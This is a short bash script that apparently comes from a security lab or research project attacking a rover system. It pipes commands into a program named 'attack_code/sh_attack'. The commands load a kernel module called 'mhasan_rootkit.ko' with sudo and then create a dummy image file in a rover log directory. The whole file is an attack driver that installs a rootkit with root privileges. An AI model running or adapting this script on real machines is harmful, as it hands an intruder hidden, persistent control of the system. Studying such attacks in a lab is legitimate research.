#!/bin/bash


attack_code/./sh_attack <<< $'sudo insmod attack_code/mhasan_rootkit.ko\ntouch ../roverlog/dummyimage.jpg\nexit\n'
